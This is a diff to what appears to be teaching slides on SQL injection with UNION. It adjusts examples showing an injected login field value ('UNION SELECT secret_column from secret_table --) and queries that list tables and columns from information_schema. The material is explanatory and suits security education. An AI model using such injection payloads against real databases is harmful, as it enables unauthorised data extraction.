@@ -128,12 +128,16 @@ SELECT username, email FROM users WHERE userid = 3;
 +-------------+-------------------------+
 ```
 
+???
+
+UNION requires the same amount of column in both select
+
 --
 
 ```SQL
 SELECT username, email FROM users WHERE userid = 1 
 UNION 
-SELECT 'hello' AS username, 'world' AS email;
+SELECT 'hello', 'world';
 +-------------+-------------------------+
 | username    | email                   |
 +-------------+-------------------------+
@@ -252,14 +256,14 @@ That's where we use the `UNION` keyword
 ```http
 POST /index.php
 
-user='UNION SELECT secret_column as username from secret_table -- 
+user='UNION SELECT secret_column from secret_table -- 
 pass=
 ```
 
 ```SQL
 SELECT username from users where username = ''
 UNION
-SELECT secret_column as username from secret_table -- ' AND password = '';
+SELECT secret_column from secret_table -- ' AND password = '';
 ```
 
 ---
@@ -269,8 +273,7 @@ SELECT secret_column as username from secret_table -- ' AND password = '';
 List tables
 
 ```SQL
-SELECT table_name FROM information_schema.tables
-WHERE table_schema != 'information_schema';
+SELECT table_name FROM information_schema.tables;
 ```
 
 --
@@ -278,8 +281,7 @@ WHERE table_schema != 'information_schema';
 List columns
 
 ```SQL
-SELECT column_name FROM information_schema.columns
-WHERE table_schema != 'information_schema';
+SELECT column_name FROM information_schema.columns;
 ```
 
 --
